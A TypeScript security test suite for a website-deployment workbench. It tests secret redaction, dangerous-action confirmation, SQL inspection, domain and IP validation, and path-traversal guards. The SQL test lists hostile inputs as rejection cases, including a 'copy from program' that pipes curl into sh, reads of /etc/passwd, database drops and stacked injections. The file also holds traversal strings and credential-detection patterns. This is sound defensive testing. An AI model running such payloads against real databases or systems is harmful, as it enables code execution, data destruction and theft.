import assert from 'node:assert/strict';
import test from 'node:test';
import { existsSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { gate, isDangerous, DANGEROUS_ACTIONS } from '../src/security/dangerGate.ts';
import { maskSecret, redactConnectionString, seal, unseal, setSecretKeyForTest } from '../src/security/secrets.ts';
import { sanitizeDetail } from '../src/audit/index.ts';
import { PostgresAdapter } from '../src/database/postgresAdapter.ts';
import { isValidIpOrCidr, validateRule } from '../src/deploy/accessControl.ts';
import { validateDomain } from '../src/deploy/domainManager.ts';
import { scanForSecrets } from '../src/deploy/websiteGenerator.ts';
import { packFilesForUpload } from '../src/deploy/uploadUtil.ts';
import { scheduleCronAllowed, jobConfigSafe } from './phase3-safety-helpers.ts';

const srcRoot = path.resolve(fileURLToPath(new URL('../src', import.meta.url)));

/* ================================================================== */
/* 1. 密钥不落明文                                                     */
/* ================================================================== */

test('安全：源码中不出现平台凭据的真实形态（含 Phase 3 新增代码）', () => {
  const files: string[] = [];
  const walk = (dir: string): void => {
    for (const e of readdirSync(dir)) {
      const abs = path.join(dir, e);
      if (statSync(abs).isDirectory()) walk(abs);
      else if (/\.(ts|tsx)$/.test(e)) files.push(abs);
    }
  };
  walk(srcRoot);
  assert.ok(files.length > 80, `应扫描到全部源码，实际 ${files.length}`);

  const SUSPECT = /(sk-[A-Za-z0-9]{16,}|AKIA[0-9A-Z]{12,}|ghp_[A-Za-z0-9]{20,}|Bearer\s+[A-Za-z0-9._-]{24,}|xox[baprs]-[A-Za-z0-9-]{10,})/;
  const offenders = files.filter((f) => SUSPECT.test(readFileSync(f, 'utf8')));
  // 允许测试文件里运行时拼接的假密钥
  const real = offenders.filter((f) => !/\.test\.ts$/.test(f));
  assert.deepEqual(real, [], `不得硬编码密钥：${real.map((f) => path.relative(srcRoot, f)).join(', ')}`);
});

test('安全：平台凭据只从环境变量读取，代码里没有默认值', () => {
  const files: string[] = [];
  const walk = (dir: string): void => {
    for (const e of readdirSync(dir)) {
      const abs = path.join(dir, e);
      if (statSync(abs).isDirectory()) walk(abs);
      else if (/\.ts$/.test(e) && !/\.test\.ts$/.test(e)) files.push(abs);
    }
  };
  walk(srcRoot);
  // 出现 process.env.VERCEL_TOKEN 等是合法的（读环境变量）；
  // 不允许的是「赋值」形式，如 VERCEL_TOKEN = 'xxx' 或 'xxx' || 'https://api.vercel.com'
  const ASSIGN = /(VERCEL_TOKEN|NETLIFY_AUTH_TOKEN|CLOUDFLARE_API_TOKEN|NEON_API_KEY|SUPABASE_ACCESS_TOKEN|WORKBENCH_SECRET_KEY)\s*[:=]\s*['"][^'"]{8,}['"]/;
  const offenders = files.filter((f) => ASSIGN.test(readFileSync(f, 'utf8')));
  assert.deepEqual(offenders, [], `不得给凭据赋默认值：${offenders.map((f) => path.relative(srcRoot, f)).join(', ')}`);
});

test('安全：加密存储的密文不含明文片段，且解密需要正确密钥', () => {
  setSecretKeyForTest('key-a-0123456789-aaaaaaaaaaaaaaaa');
  const secret = 'postgres://admin:MyS3cretPass@db.internal:5432/prod';
  const sealed = seal({ connectionString: secret });
  assert.ok(!sealed.includes('MyS3cretPass'));
  assert.ok(!sealed.includes('db.internal'));
  assert.equal(unseal<{ connectionString: string }>(sealed)?.connectionString, secret);

  // 换密钥后必须解密失败（保证「密钥变更 = 旧密文不可用」而不是静默返回垃圾）
  setSecretKeyForTest('key-b-0123456789-bbbbbbbbbbbbbbbb');
  assert.throws(() => unseal(sealed));
  setSecretKeyForTest('phase3-test-key-0123456789abcdef');
});

test('安全：审计 detail 会脱敏任何疑似凭据字段', () => {
  const sanitized = sanitizeDetail({
    provider: 'vercel',
    token: 'ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
    nested: { connectionString: 'postgres://u:p@h/db', password: 'x', normal: 'kept' },
    url: 'https://api.example.com/hook?token=abc',
  });
  assert.ok(!JSON.stringify(sanitized).includes('ghp_'));
  assert.ok(!JSON.stringify(sanitized).includes('postgres://u:p@h'));
  assert.equal((sanitized.nested as Record<string, unknown>).normal, 'kept');
  assert.equal(sanitized.provider, 'vercel');
});

test('安全：maskSecret 对短串也安全（不泄露长度）', () => {
  assert.equal(maskSecret('ab', 4), '****');
  assert.equal(maskSecret(null), '');
  assert.equal(maskSecret('abcdefghij', 4), '****ghij');
});

test('安全：连接串脱敏保留形状但去除用户名/密码/query 凭据', () => {
  const out = redactConnectionString('postgres://neondb_owner:supersecret@ep-x.neon.tech/db?sslmode=require&api_key=abc');
  assert.ok(!out.includes('supersecret'));
  assert.ok(!out.includes('abc'));
  assert.ok(out.includes('ep-x.neon.tech'));
  assert.ok(out.includes('sslmode=require'));
});

/* ================================================================== */
/* 2. 危险操作二次确认                                                 */
/* ================================================================== */

test('安全：所有 Phase 3 危险动作都要求 confirm === true', () => {
  const actions = Object.keys(DANGEROUS_ACTIONS);
  assert.ok(actions.length >= 14, `危险动作应被完整登记，实际 ${actions.length}`);
  for (const action of actions) {
    assert.equal(isDangerous(action), true);
    for (const falsy of [false, undefined, null, 0, '', 'true', 1]) {
      assert.throws(() => gate(action, falsy), /危险操作需二次确认/, `${action} 应拒绝 ${JSON.stringify(falsy)}`);
    }
    assert.doesNotThrow(() => gate(action, true), `${action} 应在 confirm=true 时放行`);
    assert.ok(DANGEROUS_ACTIONS[action as keyof typeof DANGEROUS_ACTIONS].summary.length > 0);
  }
});

test('安全：门禁拒绝时错误信息带 428 语义与细节（供前端渲染确认弹窗）', () => {
  try {
    gate('website.delete', false, { websiteProjectId: 'wsp_1' });
    assert.fail('应抛错');
  } catch (e) {
    const err = e as { status?: number; details?: unknown; message: string };
    assert.equal(err.status, 428);
    assert.match(err.message, /删除网站项目/);
    assert.ok(err.details);
  }
});

/* ================================================================== */
/* 3. SQL 注入与越权                                                   */
/* ================================================================== */

test('安全：SQL 静态校验覆盖注入与破坏性语句', () => {
  const dangerous = [
    'drop database prod',
    'drop schema public cascade',
    'truncate table users',
    "select pg_read_file('/etc/passwd')",
    "copy t from program 'curl evil.sh|sh'",
    'create extension dblink',
    'select 1; drop table users',
    'select 1; delete from users',
    'grant all on users to public',
  ];
  for (const sql of dangerous) {
    assert.equal(PostgresAdapter.inspect(sql).safe, false, `应拒绝: ${sql}`);
  }
});

test('安全：合法只读查询不被误伤', () => {
  const legit = ['select 1', 'select * from users where id = $1', 'with x as (select 1) select * from x', 'show search_path', 'explain select 1'];
  for (const sql of legit) {
    const res = PostgresAdapter.inspect(sql);
    assert.equal(res.safe, true, `不应拒绝: ${sql}（${res.reason ?? ''}）`);
    assert.equal(res.isWrite, false);
  }
});

test('安全：写操作在多语句场景下不会被伪装成只读', () => {
  assert.equal(PostgresAdapter.inspect('select 1; update users set a=1').safe, false);
  assert.equal(PostgresAdapter.inspect('select 1; insert into users values (1)').isWrite, true);
});

test('安全：IP 白名单校验逐段检查（999.1.1.1 必须被拒绝）', () => {
  assert.equal(isValidIpOrCidr('192.168.1.1'), true);
  assert.equal(isValidIpOrCidr('10.0.0.0/8'), true);
  assert.equal(isValidIpOrCidr('0.0.0.0/0'), true);
  assert.equal(isValidIpOrCidr('999.1.1.1'), false);
  assert.equal(isValidIpOrCidr('192.168.1'), false);
  assert.equal(isValidIpOrCidr('192.168.1.1/33'), false);
  assert.equal(isValidIpOrCidr('192.168.1.1/-1'), false);
  assert.throws(() => validateRule({ type: 'ip-allowlist', value: '999.1.1.1' }), /IP/);
});

test('安全：域名校验拦截通配符与平台保留域（防止误绑他方域名）', () => {
  assert.throws(() => validateDomain('*.example.com'), /通配符/);
  assert.throws(() => validateDomain('foo.vercel.app'), /保留域名/);
  assert.throws(() => validateDomain('foo.netlify.app'), /保留域名/);
  assert.throws(() => validateDomain('foo.pages.dev'), /保留域名/);
  assert.throws(() => validateDomain('a..b.com'), /不合法/);
  assert.throws(() => validateDomain('localhost'), /不合法/);
});

test('安全：生成产物密钥扫描覆盖常见凭据形态', () => {
  const cases = [
    'ghp_' + 'a'.repeat(36),
    'sk-' + 'b'.repeat(24),
    'AKIA' + 'C'.repeat(16),
    'xoxb-' + 'd'.repeat(12),
    '-----BEGIN RSA PRIVATE KEY-----',
    'postgres://user:pass@host/db',
  ];
  for (const value of cases) {
    assert.ok(scanForSecrets(value).length > 0, `应识别: ${value.slice(0, 20)}`);
  }
  assert.deepEqual(scanForSecrets('const a = 1; // 无凭据'), []);
});

test('安全：上传打包跳过二进制文件（避免把可疑文件推到平台）', () => {
  const packed = packFilesForUpload([
    { path: 'index.html', content: '<html>' },
    { path: 'secret.exe', content: 'MZ' },
    { path: 'data.db', content: 'sqlite' },
  ]);
  assert.deepEqual(packed.skipped.sort(), ['data.db', 'secret.exe']);
});

/* ================================================================== */
/* 4. 定时任务与工具调用的权限边界                                      */
/* ================================================================== */

test('安全：定时任务不接受写 SQL 与危险动作参数', () => {
  assert.equal(scheduleCronAllowed('0 9 * * *'), true);
  assert.equal(scheduleCronAllowed('* * * * * *'), false, '每秒执行应被拒绝（频率过高）');
  assert.equal(scheduleCronAllowed('nope'), false);

  assert.equal(jobConfigSafe({ sql: 'select 1' }), true);
  assert.equal(jobConfigSafe({ sql: 'delete from users' }), false);
  assert.equal(jobConfigSafe({ sql: 'select 1; drop table t' }), false);
});

/* ================================================================== */
/* 5. 路径与文件边界                                                   */
/* ================================================================== */

test('安全：生成产物写入拒绝路径穿越（多种形态）', async () => {
  const { writeProject } = await import('../src/deploy/websiteGenerator.ts');
  const dir = mkdtempSync(path.join(tmpdir(), 'ph3-sec-'));
  try {
    for (const evil of ['../../escape', '../x', 'a/../../../b', '/etc/passwd', '..\\..\\win']) {
      await assert.rejects(
        writeProject(dir, evil, [{ path: 'a.txt', content: 'x' }]),
        (e: unknown) => e instanceof Error,
        `应拒绝项目名: ${evil}`,
      );
    }
    // 合法名称应成功，且产物确实落在目录内
    const ok = await writeProject(dir, 'good-name', [{ path: 'a.txt', content: 'x' }]);
    assert.ok(ok.rootDir.startsWith('websites/'));
    assert.ok(existsSync(path.join(dir, 'websites/good-name/a.txt')));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('安全：本地预览只监听 127.0.0.1（绝不暴露到局域网）', () => {
  const source = readFileSync(path.join(srcRoot, 'deploy/localPreviewAdapter.ts'), 'utf8');
  assert.match(source, /listen\(port, '127\.0\.0\.1'/);
  assert.doesNotMatch(source, /listen\([^)]*'0\.0\.0\.0'/);
});

test('安全：生成的静态站/全栈站也不监听 0.0.0.0（除全栈站需容器部署外）', async () => {
  const { parseRequirementByRules } = await import('../src/deploy/requirements.ts');
  const { generateFiles } = await import('../src/deploy/websiteGenerator.ts');
  const staticFiles = generateFiles(parseRequirementByRules('纯展示官网'), 'x', 'x');
  const staticServer = staticFiles.find((f) => f.path === 'server.mjs')?.content ?? '';
  assert.match(staticServer, /127\.0\.0\.1/);

  // 全栈站需要被容器/Serverless 访问，必须监听 0.0.0.0 —— 但必须带访问控制说明
  const fullFiles = generateFiles(parseRequirementByRules('客户管理系统'), 'y', 'y');
  const fullServer = fullFiles.find((f) => f.path === 'server.mjs')?.content ?? '';
  assert.match(fullServer, /0\.0\.0\.0/);
  assert.match(fullServer, /ACCESS|authorized/);
});

test('安全：生成的访问控制使用环境变量读口令，不硬编码', async () => {
  const { parseRequirementByRules } = await import('../src/deploy/requirements.ts');
  const { generateFiles } = await import('../src/deploy/websiteGenerator.ts');
  const files = generateFiles(parseRequirementByRules('仅内部访问，需要密码'), 'x', 'x');
  const server = files.find((f) => f.path === 'server.mjs')?.content ?? '';
  assert.match(server, /process\.env\.SITE_PASSWORD/);
  assert.doesNotMatch(server, /SITE_PASSWORD\s*=\s*['"][^'"]+['"]/);
});
